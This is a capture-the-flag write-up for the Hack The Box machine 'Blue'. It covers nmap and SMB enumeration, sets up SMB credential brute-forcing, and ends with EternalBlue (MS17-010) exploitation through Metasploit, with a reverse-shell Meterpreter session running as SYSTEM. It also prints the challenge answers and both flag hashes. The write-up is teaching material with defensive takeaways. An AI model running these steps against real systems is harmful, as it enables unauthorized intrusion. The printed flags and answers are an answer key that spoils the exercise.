# Hack The Box — Blue Writeup

> **Difficulty:** Easy &nbsp;|&nbsp; **OS:** Windows 7 &nbsp;|&nbsp; **Category:** Retired Machine

---

## Table of Contents

- [Introduction](#introduction)
- [Machine Info](#machine-info)
- [Step 1 — Initial Reconnaissance](#step-1--initial-reconnaissance)
- [Step 2 — Version & Script Scan](#step-2--version--script-scan)
- [Step 3 — SMB Share Enumeration](#step-3--smb-share-enumeration)
- [Step 4 — Vulnerability Identification (MS17-010)](#step-4--vulnerability-identification-ms17-010)
- [Step 5 — SMB Credential Bruteforcing](#step-5--smb-credential-bruteforcing)
- [Step 6 — Exploitation (EternalBlue via Metasploit)](#step-6--exploitation-eternalblue-via-metasploit)
- [Step 7 — Flag Capture](#step-7--flag-capture)
- [Key Takeaways](#key-takeaways)

---

## Introduction

**Blue** is arguably the most iconic beginner machine on Hack The Box — and for good reason.

It demonstrates the raw power of **EternalBlue (MS17-010)**, the NSA-developed exploit leaked by the Shadow Brokers in 2017 that went on to fuel some of the most destructive cyberattacks in history, including the **WannaCry** ransomware outbreak and the **NotPetya** wiper.

Despite being a simple box, it carries a serious real-world lesson: patch management and the consequences of leaving SMB vulnerabilities unpatched.

---

## Machine Info

| Field       | Value               |
|-------------|---------------------|
| Name        | Blue                |
| OS          | Windows 7           |
| Difficulty  | Easy                |
| IP Address  | `10.129.52.38`      |
| Hostname    | `HARIS-PC`          |
| CVE         | MS17-010            |
| Platform    | Hack The Box        |

---

## Step 1 — Initial Reconnaissance

We start light — a basic **SYN scan** to see what ports are open, saving results to a file for later reference:

```bash
nmap -sS <Target_IP> -oN nmap_initialscan
```

### Output

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown
```

### Analysis

We see **9 open ports** total. The high-numbered ports (`49152–49157`) are dynamic Windows RPC endpoints worth investigating further. The 3 standard ports that immediately stand out are:

| Port | Service         | Significance             |
|------|-----------------|--------------------------|
| 135  | MSRPC           | Windows RPC              |
| 139  | NetBIOS-SSN     | SMB over NetBIOS         |
| 445  | Microsoft-DS    | SMB — primary target     |

> **Q1: How many open TCP ports are listening on Blue (excluding 5-digit ports)?**  
> **A: 3**

---

## Step 2 — Version & Script Scan

Now we run Nmap's script and version detection to gather more detail:

```bash
nmap -sC -sV -oN nmap_sc_and_sv_scan <Target_IP>
```

### Key Output

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1
49152/tcp open  msrpc        Microsoft Windows RPC
...

| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC
|   Workgroup: WORKGROUP

| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   message_signing: disabled (dangerous, but default)
```

### Findings

The high-numbered ports are all **Microsoft Windows RPC** — dynamic endpoints, nothing directly exploitable. The interesting findings are on port **445**:

- 🔴 Running **Windows 7 Professional** — a legacy OS, out of support since January 2020
- 🔴 **SMB message signing is disabled** — opens the door to relay attacks
- 🟡 Guest account access is in use

> **Q2: What is the hostname of Blue?**  
> **A: HARIS-PC**

> **Q3: What operating system is running on the target?**  
> **A: Windows 7**

---

## Step 3 — SMB Share Enumeration

List available SMB shares using a null session (no credentials):

```bash
smbclient -N -L //<Target_IP>/
```

### Output Summary

5 shares discovered in total:

| Share     | Type    | Notes                          |
|-----------|---------|--------------------------------|
| Share1    | Disk    | Non-default — worth exploring  |
| Share2    | Disk    | Non-default — worth exploring  |
| C$        | Disk    | Administrative share           |
| ADMIN$    | Disk    | Administrative share           |
| IPC$      | IPC     | Administrative IPC share       |

> **Q4: How many SMB shares are available on Blue?**  
> **A: 5**

---

## Step 4 — Vulnerability Identification (MS17-010)

With Windows 7 running SMB on port 445, we immediately think **MS17-010** — the Microsoft Security Bulletin from March 2017 that patched a critical remote code execution flaw in the Windows SMBv1 implementation.

### What is MS17-010?

MS17-010 describes a vulnerability in how Windows **SMBv1** handles certain request types. An unauthenticated attacker can send a specially crafted packet to the SMB server and achieve **Remote Code Execution (RCE)** — no credentials required.

The exploit code for this vulnerability, known as **EternalBlue**, was originally developed by the **NSA** and was subsequently leaked by a group called the **Shadow Brokers** in April 2017.

### The WannaCry Connection

Just one month after the leak, in **May 2017**, a ransomware worm called **WannaCry** spread globally using EternalBlue as its propagation engine. Within days it had infected hundreds of thousands of machines across 150 countries — crippling hospitals, banks, and telecoms.

It remains one of the most costly cyberattacks in history — a direct consequence of organizations failing to apply the MS17-010 patch that Microsoft had released **two months prior**.

> **Q5: What 2017 Microsoft Security Bulletin describes an SMB RCE vulnerability?**  
> **A: MS17-010**

> **Q6: What famous malware spread primarily via MS17-010 in May 2017?**  
> **A: WannaCry**

---

## Step 5 — SMB Credential Bruteforcing

Before jumping to exploitation, we use Metasploit's built-in SMB auxiliary modules to enumerate valid credentials:

```bash
msfconsole
search smb users
use auxiliary/scanner/smb/smb_login
show options
```

Configure the required fields (`RHOSTS`, `USER_FILE`, `PASS_FILE`, `SMBDomain`) and run the module. With credentials confirmed (or guest/anonymous access sufficient), we proceed to exploitation.

---

## Step 6 — Exploitation (EternalBlue via Metasploit)

### Find and Load the Module

```bash
msfconsole
search ms17-010
use exploit/windows/smb/ms17_010_eternalblue
```

### Configure and Run

```bash
set RHOSTS <Target_IP>
set LHOST <your-tun0-ip>
show options   # verify all required fields are set
run
```

### Result

```
[*] Started reverse TCP handler on <LHOST>:4444
[+] Host is likely VULNERABLE to MS17-010!
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We land a shell as **`nt authority\system`** — the highest privilege level on a Windows machine (equivalent to `root` on Linux). **No privilege escalation required** — EternalBlue goes straight to SYSTEM.

> **Q7: What user do you get execution as when exploiting MS17-010?**  
> **A: nt authority\system**

---

## Step 7 — Flag Capture

With a SYSTEM shell, both flags are trivially accessible.

### 🚩 User Flag

```cmd
type C:\Users\haris\Desktop\user.txt
```

```
132f461d8478d71d2ae9c423b2e3aeae
```

### 🏆 Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

```
1d01a731a6a2162749b6e3fb1b9d9c45
```

> **Q8: User flag?**  
> **A: `132f461d8478d71d2ae9c423b2e3aeae`**

> **Q9: Root flag?**  
> **A: `1d01a731a6a2162749b6e3fb1b9d9c45`**

---

## Key Takeaways

| # | Lesson |
|---|--------|
| 1 | **Disable legacy protocols.** SMBv1 has a long history of critical vulnerabilities. Modern Windows disables it by default — older systems often don't. |
| 2 | **Patch management is non-negotiable.** EternalBlue had a patch available *two months* before WannaCry. Delayed patching cost billions. |
| 3 | **Enable SMB signing.** Nmap flagged signing as disabled on this box. Enabling it prevents relay attacks at near-zero cost. |
| 4 | **Enumerate before you exploit.** Even with an unauthenticated exploit, knowing valid usernames and the auth landscape gives you more options and fallback paths. |

---

> ⚠️ *Always ensure you have explicit written authorization before testing any system. This writeup is for educational purposes on a retired Hack The Box machine only.*

---

*Happy hacking! 🎯*
